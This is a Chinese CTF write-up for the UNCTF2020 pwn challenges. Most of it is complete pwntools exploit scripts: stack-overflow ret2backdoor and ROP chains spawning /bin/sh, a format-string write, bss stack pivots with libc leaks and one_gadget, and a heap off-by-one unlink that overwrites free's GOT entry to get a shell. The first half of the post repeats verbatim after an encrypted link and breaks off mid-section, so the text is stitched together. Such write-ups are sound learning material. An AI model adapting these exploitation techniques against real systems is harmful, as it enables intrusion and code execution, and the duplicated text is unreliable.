
# [原创]UNCTF2020 pwn部分题解

## YLBNB

`pwntools`连上打印即可

![](upload/attach/202011/860872_4V6DDRPJXBYDG7R.png)

## fan

栈溢出+给了后门：

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',34808)
payload='a'*(0x30+8)+p64(0x400735)
p.sendline(payload)
```

## do_you_like_me?

栈溢出，给了`system`和`binsh`

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',37305)
binsh=0x00000000004007E4
system=0x400590
pop=0x00000000004007c3 #pop rdi ; ret
payload='a'*0x18+p64(pop)+p64(binsh)+p64(system)
p.sendline(payload)
```

## 你真的会pwn嘛？

格式化字符串漏洞，偏移为10：

![](upload/attach/202011/860872_T2AZWAMNRZSPCH3.png)

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',31841)
# gdb.attach(p,'b *0x4007BA')
target=0x60107C
payload='aaa%11$n'+p64(target)
p.sendline(payload)
```

## keer's bug

![](upload/attach/202011/860872_R8KMYAJS7UUYBHD.png)

栈溢出，但只能溢出很少长度，考虑栈迁移到`bss`段，首先布置参数到`bss`，第一次可以修改`rpb`为`bss`段地址，之后返回到`main`函数的`read`之前

![](upload/attach/202011/860872_Q6D6857PKUFZGSM.png)

就可以往`bss`段写入`0x70`了，布置参数最后转移到`bss`进行`rop` leak libc，最后调用`system`(执行到`do_system`后出现了点问题，改为`one_gadget`)

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
my_u64 = lambda x: u64(x.ljust(8, '\0'))
#p = remote('node2.hackingfor.fun',38187)
p=process('./keer')
elf=ELF('./keer')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
write_got=elf.got['write']
write_plt=elf.sym['write']
main_addr=elf.symbols['main']
leave=0x08048408 #leave ; ret
bss=elf.bss()
pop=0x0000000000400673 #op rdi ; ret
pop2=0x0000000000400671 # pop rsi ; pop r15 ; ret
ret=0x0000000000400451 # ret
leave_ret=0x40060D
offset=88
# gdb.attach(p)
p.recvuntil('keer')
payload='a'*(offset-8)+p64(bss)+p64(0x04005ED)
#0x04005ED为main中read函数地址
p.sendline(payload)
sleep(0.5)
payload=p64(pop)+p64(1)+p64(pop2)+p64(write_got)+p64(0)+p64(write_plt)
#leak libc
payload+=p64(main_addr)+p64(0)+p64(0)+p64(0)+p64(bss-0x58)+p64(leave_ret)
#返回到main
#bss-0x58是0x50+0x8(pop ebp)
# pause()
p.send(payload)
p.recv(8)#有点垃圾数据
write=my_u64(p.recv(6))
success("write addr:"+hex(write))
libc_base=write-libc.sym['write']
# system=libc_base+libc.sym['system']
# binsh=libc_base+next(libc.search('/bin/sh'))
# libc=LibcSearcher('write',write)
# libc_base=write-libc.dump('write')
# system=libc.dump('system')+libc_base
# binsh=libc.dump('str_bin_sh')+libc_base
# success('system address: '+hex(system))
# success('binsh address: '+hex(binsh))
# gdb.attach(p)
# pause()
# payload='a'*offset+p64(pop)+p64(binsh)+p64(system)
payload='a'*offset+p64(libc_base+0xf1207)#0x4527a 0xf1207 0xf0364 0x45226
p.sendline(payload)
p.interactive()
```

## baby_heap

`ida`静态分析，正常菜单题

不知道这个是干什么，可以`leak` `stdin`吗?

![](upload/attach/202011/860872_7V9PCSBERRDPDDU.png)

![](upload/attach/202011/860872_HSFWVQHETV259DR.png)

`add`时长度加了1

`edit`就可以off-by-one了

![](upload/attach/202011/860872_4N47MM6QV7YB28S.png)

`show`功能是假的：

![](upload/attach/202011/860872_8YE28FJENB9MAR5.png)

给了后门：

![](upload/attach/202011/860872_ZFJQ9FNPVEPTYJC.png)

直接`unlinkg`改`free`为`shell`就行

```python
from pwn import *
context.log_level = 'debug'
# p=remote('node2.hackingfor.fun',35659)
p = process('./pwn')
elf=ELF('./pwn')
def launch_gdb():
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
gdb.attach(proc.pidof(p)[0])
def new(s,c):
p.recvuntil('>>')
p.sendline('1')
p.recvuntil('size?')
p.sendline(str(s))
p.recvuntil('content?')
p.send(c)
def delete(i):
p.recvuntil('>>')
p.sendline('2')
p.recvuntil('index ?')
p.sendline(str(i))
def show(i):
p.recvuntil('>>')
p.sendline('3')
p.recvuntil('index ?')
p.sendline(str(i))
def edit(i,s):
p.recvuntil('>')
p.sendline('4')
p.recvuntil('index ?')
p.sendline(str(i))
p.recvuntil('content ?')
p.send(s)
# launch_gdb()
shell=0x040097F
data_addr=0x602160
free=elf.got['free']
new(0x108,'aaa')#size=0x110
new(0xf0,'bbb')#size=0x100
new(0x100,'/bin/sh\x00')
payload=p64(0)+p64(0x101)+p64(data_addr-0x18)+p64(data_addr-0x10)
payload=payload.ljust(0x100,'a')+p64(0x100)+p8(0)
edit(0,payload)
delete(1)
payload=p64(0)*3+p64(free)
edit(0,payload)
success('free:'+hex(free))
edit(0,p64(shell))
delete(0)
p.interactive()
```

## 原神

首先逆向分析一波：一堆随机抽卡的东西，关键在于

![](upload/attach/202011/860872_5XQ37YGMHZHNTZP.png)

![](upload/attach/202011/860872_VHPPKHSXEAPYAQ3.png)

存在溢出并给了`system`地址

但是最后`close(1)`关闭了`stdout`无法`leak`了，而且溢出长度也不够一次长的`rop`，需要栈迁移获取`shell`

栈迁移跟`keer's bug`一样，通过只覆盖`ebp`的值然后`ret`填上`main`中的`read`来布置参数（跟以前做的布置好参数再`leave ret`不太一样）

调试时执行`system`之后会调试不了父进程，需要命令：

```python
set follow-fork-mode parent
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
my_u64 = lambda x: u64(x.ljust(8, '\0'))
p = remote('219.152.60.100',54232)
# p=process('./GenshinSimulator')
elf=ELF('./GenshinSimulator')
read_plt=elf.plt['read']
read_got=elf.got['read']
system=elf.plt['system']
pop=0x400d13 #pop rdi ; ret
pop2=0x400d11 #pop rsi ; pop r15 ; ret
leave=0x400CA0
main_read=0x400C63
main_addr=0x400B26
#cat flag>&2
# bss=0x6022E0
bss=0x602000+0x308+0x400
ret=0x4006c6#0x0000000000400294
p.recvline()
p.recvline()
p.sendline('3')
p.recvline()
p.recvline()
p.sendline('1')
p.recvline()
# gdb.attach(p)
# payload='a'*0x30+p64(target)+p64(0x400B26)
# gdb.attach(p)
payload='a'*0x30+p64(bss+0x30)+p64(main_read)+'\x00'*0x18
# payload='a'*0x30+p64(0x602308+0x30)+p64(main_read)
p.send(payload)
sleep(0.5)
payload=b'/bin/sh\x00'*4+p64(0)*3+p64(pop)+p64(bss+0x50)+p64(system)+b'/bin/sh\x00'
# payload=p64(0)*2+';;;;;;;;'+b'/bin/sh;'+p64(0)*5+'1111111'+p64(ret)+p64(pop)+p64(bss)+p64(system)
# payload=p64(pop)+p64(1)+p64(pop2)+p64(0x602280)+p64(0)+p64(read_plt)+p64(0x602308)+p64(leave)
# payload=p64(0)*3+'/bin/sh\x00'+p64(0)*7+p64(pop)+p64(0x602308)+p64(system)+p64(0x602308)+p64(1)
p.send(payload)
# p.sendline('/bin/sh\x00')
# gdb.attach(p)
p.interactive()
```

这题调试了很久，主要是两个地方：

第一个最后停在了`do_system`函数里，`rop`前面加了`ret`也不行

最后经过`Niebelungen`师傅的提醒，原来是最后两次不能用`sendline`，应该改为`send`（最后多出了`0xa`，可能会有影响）

第二个是迁移的地址，刚开始就是`bss`首地址，结果一直不行，最后加了一点偏移之后就可以了

之后获取`shell`之后重定向即可

![](upload/attach/202011/860872_7KEV8SA9KJM5H7A.png)

（题目链接：<mark class="encrypted">e65K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6#2L8X3y4@1k6W2)9J5k6h3S2S2j5$3E0A6L8X3N6X3L8%4u0Q4x3X3g2X3N6h3&6Q4x3V1k6Q4c8f1k6Q4b7V1y4Q4z5o6V1`.</mark>

## YLBNB

`pwntools`连上打印即可

![](https://bbs.kanxue.com/upload/attach/202011/860872_4V6DDRPJXBYDG7R.png)

## fan

栈溢出+给了后门：

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',34808)
payload='a'*(0x30+8)+p64(0x400735)
p.sendline(payload)
```

## do_you_like_me?

栈溢出，给了`system`和`binsh`

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',37305)
binsh=0x00000000004007E4
system=0x400590
pop=0x00000000004007c3 #pop rdi ; ret
payload='a'*0x18+p64(pop)+p64(binsh)+p64(system)
p.sendline(payload)
```

## 你真的会pwn嘛？

格式化字符串漏洞，偏移为10：

![](https://bbs.kanxue.com/upload/attach/202011/860872_T2AZWAMNRZSPCH3.png)

```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=remote('node2.hackingfor.fun',31841)
# gdb.attach(p,'b *0x4007BA')
target=0x60107C
payload='aaa%11$n'+p64(target)
p.sendline(payload)
```

## keer's bug

![](https://bbs.kanxue.com/upload/attach/202011/860872_R8KMYAJS7UUYBHD.png)

栈溢出，但只能溢出很少长度，考虑栈迁移到`bss`段，首先布置参数到`bss`，第一次可以修改`rpb`为`bss`段地址，之后返回到`main`函数的`read`之前

![](https://bbs.kanxue.com/upload/attach/202011/860872_Q6D6857PKUFZGSM.png)

就可以往`bss`段写入`0x70`了，布置参数最后转移到`bss`进行`rop` leak libc，最后调用`system`(执行到`do_system`后出现了点问题，改为`one_gadget`)
